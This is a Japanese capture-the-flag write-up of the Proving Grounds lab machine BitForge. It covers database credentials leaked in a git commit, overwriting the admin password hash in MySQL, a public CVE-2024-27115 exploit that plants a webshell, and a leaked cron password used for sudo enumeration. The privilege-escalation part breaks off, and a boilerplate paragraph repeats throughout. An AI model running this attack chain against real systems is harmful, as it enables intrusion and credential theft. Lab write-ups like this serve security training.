---
title: "Proving Grounds - BitForge (Linux)"
date: 2026-02-25
description: "Proving Grounds BitForge Linux マシン解説。偵察・初期アクセス・権限昇格を解説。"
categories: [Proving Grounds, Linux]
tags: [rce, suid, php, privilege-escalation]
mermaid: true
content_lang: ja
alt_en: /posts/pg-bitforge/
---

## 概要

| 項目 | 内容 |
|---------------------------|-------|
| OS | Linux |
| 難易度 | 記録なし |
| 攻撃対象 | Webアプリケーションおよび公開されているネットワークサービス |
| 主な侵入経路 | Web RCE (CVE-2024-27115) |
| 権限昇格経路 | ローカル列挙 → 設定ミスの悪用 → root |

## 認証情報

認証情報なし。

## 偵察

---
💡 なぜ有効か
このフェーズでは到達可能な攻撃対象領域をマッピングし、悪用が最も成功しやすい箇所を特定します。正確なサービスおよびコンテンツ探索により、闇雲なテストを減らし、標的を絞った後続アクションに繋げます。

## 初期足がかり

---
![Screenshot from the bitforge engagement](/assets/img/pg/bitforge/Pasted%20image%2020251211035842.png)
*キャプション：このフェーズで取得したスクリーンショット*

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
mcsam@bitforge.lab
```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
git show 18833b811e967ab8bec631344a6809aa4af59480
```

```bash
✅[23:40][CPU:4][MEM:63][TUN0:192.168.45.168][...ome/n0z0/work/pg/BitForge]
🐉 > git show 18833b811e967ab8bec631344a6809aa4af59480
commit 18833b811e967ab8bec631344a6809aa4af59480
Author: McSam Ardayfio <mcsam@bitforge.lab>
Date:   Mon Dec 16 16:43:08 2024 +0000

    added the database configuration

diff --git a/db-config.php b/db-config.php
new file mode 100644
index 0000000..c1d2b96
--- /dev/null
+++ b/db-config.php
@@ -0,0 +1,19 @@
+<?php
+// Database configuration
+$dbHost = 'localhost'; // Change if your database is hosted elsewhere
+$dbName = 'bitforge_customer_db';
+$username = 'BitForgeAdmin';
+$password = 'B1tForG3S0ftw4r3S0lutions';
+
+try {
+    $dsn = "mysql:host=$dbHost;dbname=$dbName;charset=utf8mb4";
+    $pdo = new PDO($dsn, $username, $password);
+
+    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+
+    echo "Connected successfully to the database!";
+} catch (PDOException $e) {
+    echo "Connection failed: " . $e->getMessage();
+}
+?>
+
```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
mysql -h $ip -u BitForgeAdmin -p --skip-ssl
```

```bash
❌[23:46][CPU:3][MEM:64][TUN0:192.168.45.168][...ome/n0z0/work/pg/BitForge]
🐉 > mysql -h $ip -u BitForgeAdmin -p --skip-ssl 
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 156
Server version: 8.0.40-0ubuntu0.24.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash

MySQL [soplanning]> SELECT * FROM *;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '*' at line 1
MySQL [soplanning]> SELECT * FROM planning_audit;
Empty set (0.089 sec)

MySQL [soplanning]> SELECT * FROM planning_user;
+-----------+----------------+---------------+-------+------------------------------------------+-------+------------------+---------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+---------------+---------+-----------+--------+--------+-------------+--------------------+-------------+-------------+------------+---------------------+------------+----------+----------------------+
| user_id   | user_groupe_id | nom           | login | password                                 | email | visible_planning | couleur | droits                                                                                                                                                                                                                                          | cle                              | notifications | adresse | telephone | mobile | metier | commentaire | date_dernier_login | preferences | login_actif | google_2fa | date_creation       | date_modif | tutoriel | tarif_horaire_defaut |
+-----------+----------------+---------------+-------+------------------------------------------+-------+------------------+---------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+---------------+---------+-----------+--------+--------+-------------+--------------------+-------------+-------------+------------+---------------------+------------+----------+----------------------+
| ADM       |           NULL | admin         | admin | 77ba9273d4bcfa9387ae8652377f4c189e5a47ee | NULL  | non              | 000000  | ["users_manage_all", "projects_manage_all", "projectgroups_manage_all", "tasks_modify_all", "tasks_view_all_projects", "lieux_all", "ressources_all", "parameters_all", "stats_users", "stats_projects", "audit_restore", "stats_roi_projects"] | dbee8fd60fd4244695084bd84a996882 | oui           | NULL    | NULL      | NULL   | NULL   | NULL        | NULL               | NULL        | oui         | setup      | 2025-01-16 14:21:15 | NULL       | NULL     |                 NULL |

```

`77ba9273d4bcfa9387ae8652377f4c189e5a47ee`
![Screenshot from the bitforge engagement](/assets/img/pg/bitforge/Pasted%20image%2020251212002521.png)
*キャプション：このフェーズで取得したスクリーンショット*

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```php
	public function hashPassword($password){
		return sha1("�" . $password . "�");

```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
printf '\xA4Password123\xA4' | sha1sum
```

```bash
✅[0:35][CPU:3][MEM:63][TUN0:192.168.45.168][...ome/n0z0/work/pg/BitForge]
🐉 > printf '\xA4Password123\xA4' | sha1sum                                                                                         
58222040a9316af9e4a28381bc173aabfdc41c54  -
```

00000000  c2 a4                                             |..|
00000002
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```sql
MySQL [soplanning]> UPDATE planning_user
    -> SET password = '58222040a9316af9e4a28381bc173aabfdc41c54'
    -> WHERE user_id = 'ADM';
Query OK, 1 row affected (0.092 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

![Screenshot from the bitforge engagement](/assets/img/pg/bitforge/Pasted%20image%2020251212010327.png)
*キャプション：このフェーズで取得したスクリーンショット*

![Screenshot from the bitforge engagement](/assets/img/pg/bitforge/Pasted%20image%2020251212010337.png)
*キャプション：このフェーズで取得したスクリーンショット*

![Screenshot from the bitforge engagement](/assets/img/pg/bitforge/Pasted%20image%2020251212010357.png)
*キャプション：このフェーズで取得したスクリーンショット*

https://github.com/theexploiters/CVE-2024-27115-Exploit
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
python3 SOPlanning-1.52.01-RCE-Exploit.py -t http://plan.bitforge.lab/www -u admin -p Password123
```

```bash
❌[1:15][CPU:4][MEM:59][TUN0:192.168.45.168][...ge/CVE-2024-27115-Exploit]
🐉 > python3 SOPlanning-1.52.01-RCE-Exploit.py -t http://plan.bitforge.lab/www -u admin -p Password123
[+] Uploaded ===> File 'hfj.php' was added to the task !
[+] Exploit completed.
Access webshell here: http://plan.bitforge.lab/www/upload/files/h13wii/hfj.php?cmd=<command>
Do you want an interactive shell? (yes/no) yes
soplaning:~$ 
```

════════════════════════════╣ Other Interesting Files ╠════════════════════════════
                            ╚═════════════════════════╝
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path
/usr/bin/rescan-scsi-bus.sh
/usr/bin/gettext.sh
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
2025/12/11 17:46:01 CMD: UID=0     PID=30058  | /bin/sh -c mysqldump -u jack -p'j4cKF0rg3@445' soplanning >> /opt/backup/soplanning_dump.log 2>&1   

```

💡 なぜ有効か
初期足がかりのステップでは、発見した脆弱性を連鎖させてターゲットを実行制御下に置きます。成功した足がかり技法は、コマンド実行またはインタラクティブシェルの取得によって検証されます。

## 権限昇格

---
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
sudo -l
```

```bash
jack@BitForge:~$ sudo -l
Matching Defaults entries for jack on bitforge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, !env_reset

User jack may run the following commands on bitforge:
    (root) NOPASSWD: /usr/bin/flask_password_changer
```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
cat /usr/bin/flask_password_changer
```

```bash
jack@BitForge:~$ cat /usr/bin/flask_password_changer

```

💡 なぜ有効か
権限昇格は、ローカルの設定ミス・安全でないパーミッション・信頼された実行パスを利用します。これらの信頼境界を列挙して悪用することが、rootレベルのアクセスへの最短経路です。

## まとめ・学んだこと

- 本番同等の環境でフレームワークのデバッグモードとエラー露出を検証する。
- 特権ユーザーやスケジューラーが実行するスクリプト・バイナリのファイルパーミッションを制限する。
- ワイルドカード展開やスクリプト化可能な特権ツールを避けるため sudo ポリシーを強化する。
- 露出した認証情報と環境ファイルを重要機密として扱う。

## 参考文献

- CVE-2024-27115: https://nvd.nist.gov/vuln/detail/CVE-2024-27115
- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- feroxbuster: https://github.com/epi052/feroxbuster
- Nuclei: https://github.com/projectdiscovery/nuclei
- GTFOBins: https://gtfobins.org/
- HackTricks Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
